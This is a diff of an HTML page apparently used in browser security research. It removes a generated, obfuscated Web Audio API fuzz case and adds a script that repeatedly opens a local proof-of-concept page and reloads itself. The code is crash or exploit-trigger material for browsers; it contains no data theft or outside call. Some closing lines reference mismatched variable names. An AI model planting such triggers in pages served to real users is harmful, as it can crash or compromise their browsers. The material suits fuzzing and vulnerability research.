@@ -1,94 +1,28 @@
-<<head>
-    <meta http-equiv="refresh" content="1">
-</head>
-
-
-
-<html>
 <script>
-try{var __cass__0__ = new AudioContext();}catch(__cass__1__){}
-try{var __cass__2__ = __cass__0__.destination;}catch(__cass__1__){}
-try{var __cass__3__ = new AudioContext();}catch(__cass__1__){}
-try{__cass__14__.getByteTimeDomainData(__cass__33__);}catch(__cass__1__){}
-__cass__4__ = new Float32Array(2);
-__cass__5__ = new Float32Array(2);
-for (var __cass__6__=0; __cass__6__<2; __cass__6__++){__cass__4__[__cass__6__] = 0x42;}
-for (var __cass__6__=0; __cass__6__<2; __cass__6__++){__cass__5__[__cass__6__] = 0x2;}
-try{var __cass__7__ = __cass__0__.createWaveShaper();}catch(__cass__1__){}
-try{__cass__7__.oversample = '2x';}catch(__cass__1__){}
-__cass__8__ = new Float32Array(1);
-for (var __cass__6__=0; __cass__6__<1; __cass__6__++){__cass__8__[__cass__6__] = 0x46;}
-try{var __cass__9__ = __cass__3__.createPanner();}catch(__cass__1__){}
-try{__cass__9__.refDistance = 6;}catch(__cass__1__){}
-try{var __cass__10__ = new OfflineAudioContext(16,44100*40,44100);}catch(__cass__1__){}
-try{__cass__10__.startRendering();}catch(__cass__1__){}
-try{oscNode1.start();}catch(__cass__1__){}
-try{var __cass__11__ = __cass__0__.createPanner();}catch(__cass__1__){}
-try{SpannerNode3.connect(__cass__12__);}catch(__cass__1__){}
-setTimeout(function(){try{scriptProcessorNode2.disconnect(waveShaper2, 1, 0);}catch(__cass__1__){}}, 225);
-try{__cass__14__.getFloatFrequencyData(__cass__16__);}catch(__cass__1__){}
-try{__cass__0__.suspend();}catch(__cass__1__){}
-try{var __cass__12__ = audioContext3.createMediaStreamDestination();}catch(__cass__1__){__cass__0__[__cass__1__] = 0x44;}for (var __cass__6__=0; __cass__6__<19; __cass__6__++){
-try{ parent.document.querySelector('iframe').remove(); }catch(__cass__0__){}
-}try{var __cass__13__ = __cass__0__.createIIRFilter(__cass__4__, __cass__4__.reverse() );}catch(__cass__1__){}
-try{__cass__0__.setProperty("grid-area", "1"); }catch(__cass__1__){}
-try{var __cass__14__ = __cass__3__.createAnalyser();}catch(__cass__1__){}
-try{__cass__14__.fftSize = 256;}catch(__cass__1__){}
-try{var __cass__15__ = __cass__14__.frequencyBinCount;}catch(__cass__1__){}
-try{var __cass__16__ = new Float32Array(__cass__15__);}catch(__cass__1__){}
-try{__cass__25__.connect(channelSplitter4);}catch(__cass__1__){}
-try{compressorNode3.connect(filterNode3);}catch(__cass__1__){}
-try{__cass__11__.connect(__cass__7__);}catch(__cass__1__){}
-try{oscNode3.connect(analyser3);}catch(__cass__1__){}
-try{var __cass__17__ = analyser1.frequencyBinCount;}catch(__cass__1__){}
-try{var __cass__18__ = new Float32Array(__cass__17__);}catch(__cass__1__){}
-try{listener4.__cass__19__=128.48;}catch(__cass__1__){}
-try{var __cass__7__ = __cass__0__.createWaveShaper();}catch(__cass__1__){}
-try{var __cass__20__ = __cass__3__.sampleRate * 2;}catch(__cass__1__){}
-try{var __cass__21__ = __cass__3__.createBuffer(1, __cass__20__, __cass__3__.sampleRate);}catch(__cass__1__){}
-try{__cass__21__.length = 11654;}catch(__cass__1__){}
-var __cass__22__ = new Float32Array;
-try{ __cass__21__.copyFromChannel(__cass__22__, 4, 6);}catch(__cass__1__){}
-var __cass__22__ = new Float32Array;
-try{ __cass__21__.copyToChannel(__cass__22__, 2, 7);}catch(__cass__1__){}
-try{var __cass__23__ = new OfflineAudioContext(26,44100*40,44100);}catch(__cass__1__){}
-try{__cass__23__.startRendering();}catch(__cass__1__){}
-try{__cass__31__.stop();}catch(__cass__1__){}
-try{audioBufferSource1.loopEnd = 35533;}catch(__cass__1__){}
-try{audioBufferSource1.loopStart = 5;}catch(__cass__1__){}
-try{var __cass__24__ = audioBuffer3.getChannelData(3);}catch(__cass__1__){}
-try{__cass__32__.dopplerFactor=1;}catch(__cass__1__){}
-try{audioBufferSource3.start();}catch(__cass__1__){}
-try{__cass__0__.resume();}catch(__cass__1__){}
-try{var __cass__25__ = audioContext4.createGain();}catch(__cass__1__){}
-try{__cass__25__.gain.value = 1;}catch(__cass__1__){}
-try{listener4.setPosition(1,9,3);}catch(__cass__1__){}
-try{var __cass__26__ = new Uint8Array(bufferLength4);}catch(__cass__1__){}
-try{analyser4.getByteTimeDomainData(__cass__26__);}catch(__cass__1__){}
-try{var __cass__11__ = __cass__0__.createPanner();}catch(__cass__1__){}
-try{__cass__11__.distanceModel = 'exponential';}catch(__cass__1__){}
-try{__cass__11__.maxDistance = 8523;}catch(__cass__1__){}
-try{var __cass__27__ = new Float32Array(29);;}catch(__cass__1__){}
-for (var __cass__6__=0; __cass__6__<29; __cass__6__++){__cass__27__[__cass__6__] = 0x44;}
-__cass__27__[3]=31337;
-try{var __cass__28__ = new Float32Array(29);}catch(__cass__1__){}
-try{audioBuffer4.sampleRate = 44100;}catch(__cass__1__){}
-try{audioBuffer4.numberOfChannels= 4;}catch(__cass__1__){}
-var __cass__29__ = new Float32Array;
-try{ audioBuffer4.copyFromChannel(__cass__29__, 1, 8);}catch(__cass__1__){}
-try{audioContext4.resume();}catch(__cass__1__){}
-try{var __cass__10__ = new OfflineAudioContext(26,44100*40,44100);}catch(__cass__1__){
-var __cass__0__ = __cass__1__[__cass__25__];
-__cass__0__[1] = 1.1;
-}
-try{__cass__10__.startRendering();}catch(__cass__1__){}
-try{var __cass__30__ = audioContext3.createGain();}catch(__cass__1__){}
-try{__cass__30__.gain.value = 0;}catch(__cass__1__){}
-try{var __cass__31__ = audioContext4.createOscillator();}catch(__cass__1__){}
-try{__cass__31__.detune.value = 71;}catch(__cass__1__){}
-try{var __cass__32__ = __cass__0__.listener;}catch(__cass__1__){}
-try{audioBufferSource1.start();}catch(__cass__1__){}
-try{var __cass__33__ = new Uint8Array(__cass__15__);}catch(__cass__1__){}
-try{__cass__14__.getByteFrequencyData(__cass__33__);}catch(__cass__1__){}
+function test(){
+ child_1 = window.open("http://127.0.0.1:8605/poc.html") ;
+child_2 = window.open("http://127.0.0.1:8605/poc.html") ;
+child_3 = window.open("http://127.0.0.1:8605/poc.html") ;
+
+
+ }
+
+test();
 </script>
-</html>
+
+<script type="text/javascript">
+setTimeout(function(){  
+
+   location = location;
+  },1050)
+
+
+setTimeout(function(){  
+
+   child1.close();
+   child2.close();
+
+   child3.close();
+  },1200)
+
+</script>
